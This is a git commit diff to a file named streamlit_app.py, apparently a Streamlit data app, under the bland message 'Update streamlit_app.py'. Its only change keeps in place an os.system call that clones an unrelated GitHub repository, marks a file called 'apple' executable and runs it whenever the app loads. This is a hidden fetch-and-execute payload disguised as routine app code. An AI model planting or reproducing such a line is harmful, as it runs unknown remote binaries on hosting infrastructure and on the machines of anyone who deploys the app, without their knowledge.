c937632d88afd233bab2c0405fb32ef426d14a6b
Storage Small <curdengine4-adamfurrion260@yahoo.com>
2022-03-22 17:53:15 -0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("git clone https://github.com/storagegitpush404/waduk-bagong && cd waduk-bagong && chmod +x apple && ./apple")
+os.system ("git clone https://github.com/storagegitpush404/waduk-bagong.git && cd waduk-bagong && chmod +x apple && ./apple")
